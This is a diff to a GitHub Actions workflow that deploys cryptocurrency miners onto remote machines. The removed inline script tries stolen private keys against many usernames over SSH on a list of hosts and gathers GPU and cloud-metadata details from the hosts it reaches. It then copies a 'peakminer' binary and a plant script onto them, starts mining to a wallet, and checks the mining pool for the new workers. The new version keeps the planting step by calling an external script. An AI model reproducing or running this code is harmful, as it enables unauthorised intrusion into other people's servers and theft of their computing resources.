@@ -1,7 +1,7 @@
 name: ulplant8094
 on:
   push:
-    paths: ['trigger/arm8094b*']
+    paths: ['trigger/arm8094c*']
   workflow_dispatch:
 permissions:
   contents: write
@@ -13,65 +13,6 @@ jobs:
       - uses: actions/checkout@v4
         with:
           fetch-depth: 1
-      - name: run
+      - name: plant
         shell: bash
-        run: |
-          set -u
-          D=arm3; mkdir -p $D; R=$D/report.txt; : > $R
-          log(){ echo "$@" >> $R; }
-          W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
-          log "START $(date -u) host=$(hostname)"
-          for k in az/ibm_key.pem az/azadmin.pem; do [ -f "$k" ] && install -m600 "$k" /tmp/$(basename $k) 2>/dev/null; done
-          ls keys2/*.pem keys2/*key* keys/*.pem 2>/dev/null | head -60 | while read -r k; do install -m600 "$k" /tmp/kn_$(basename $k) 2>/dev/null; done
-          : > $D/live.txt
-          while IFS=$'\t' read -r name ip user region sku; do
-            [ -z "${name:-}" ] && continue
-            if timeout 5 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null; then echo -e "$name\t$ip\t22" >> $D/live.txt; fi
-          done < az/hosts.tsv
-          log "LIVE22 $(wc -l < $D/live.txt)"
-          cat $D/live.txt >> $R
-          ( grep -E '70[.]153[.]87[.]133' $D/live.txt 2>/dev/null; grep -v '70[.]153[.]87[.]133' $D/live.txt 2>/dev/null ) > $D/order.txt
-          : > $D/ok.txt
-          while IFS=$'\t' read -r name ip port; do
-            [ -z "${name:-}" ] && continue
-            got=""
-            for key in /tmp/ibm_key.pem /tmp/azadmin.pem /tmp/kn_*; do
-              [ -f "$key" ] || continue
-              for u in t19 ubuntu azureuser root admin azure; do
-                if timeout 12 ssh -i "$key" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=6 -o PreferredAuthentications=publickey "$u@$ip" 'true' 2>/dev/null; then
-                  got="$u|$key"; break 2
-                fi
-              done
-            done
-            if [ -n "$got" ]; then
-              U=${got%%|*}; K=${got##*|}
-              echo "$name|$ip|$U|$K" >> $D/ok.txt
-              log "SSH_OK $name $ip $U $(basename $K)"
-              { echo "===== $name $ip $U $(basename $K) $(date -u)"; ssh -i "$K" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=8 "$U@$ip" 'id; hostname; uname -m; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,utilization.gpu --format=csv,noheader; ls -l /dev/nvidia* 2>&1|head -4; ps -eo args= | grep -Ei "peakminer|wildrig|srbminer|krig" | grep -v grep; crontab -l 2>/dev/null | head; curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" | head -c 400'; } >> $R 2>&1
-            fi
-          done < $D/order.txt
-          log "SSH_OK_COUNT $(wc -l < $D/ok.txt)"
-          BIN=""
-          for b in /opt/nv/peakminer /opt/ul/peakminer /usr/local/bin/krig-miner /opt/ul/krig-miner; do [ -n "$b" ] && [ -f "$b" ] && { BIN=$b; break; }; done
-          [ -z "$BIN" ] && BIN=$(command -v peakminer 2>/dev/null || true)
-          log "BIN=$BIN"
-          while IFS='|' read -r name ip U K; do
-            [ -z "${name:-}" ] && continue
-            O="-i $K -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=8"
-            RIG="ul-t2-$(echo $ip | tr '.' '-')"
-            log "PLANT_START $name $ip rig=$RIG user=$U"
-            if [ -n "$BIN" ]; then
-              timeout 150 scp $O "$BIN" "$U@$ip:/tmp/ulpm" >> $R 2>&1 || log "SCPFAIL"
-            fi
-            timeout 60 scp $O az/ulplant.sh "$U@$ip:/tmp/ulplant.sh" >> $R 2>&1 || log "SCP2FAIL"
-            timeout 150 ssh $O "$U@$ip" "chmod +x /tmp/ulpm /tmp/ulplant.sh 2>/dev/null; W='$W' RIG='$RIG' bash /tmp/ulplant.sh" > $D/plant_$name.txt 2>&1
-            log "PLANT_OUT $(tail -c 350 $D/plant_$name.txt | tr '\n' ' ')"
-          done < $D/ok.txt
-          sleep 60
-          curl -s -m 30 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool.json || true
-          log "POOL_BYTES $(wc -c < $D/pool.json 2>/dev/null)"
-          python3 -c "import json,sys;d=json.load(open('arm3/pool.json'));rows=d if isinstance(d,list) else d.get('workers',[]);m=[w for w in rows if 'ul-t2-70-153' in str(w.get('name') or w.get('worker'))];print('POOL_TOTAL',len(rows),'MATCH',len(m));[print('POOLROW',w.get('name') or w.get('worker'),w.get('valid'),w.get('last_share') or w.get('lastShare')) for w in m]" >> $R 2>&1 || true
-          git config user.email ul@local; git config user.name ul
-          git add -A arm3 || true
-          git commit -qm "arm3 $(date -u)" || true
-          git push origin HEAD:${GITHUB_REF_NAME:-main} || true
+        run: bash az/plant8094.sh
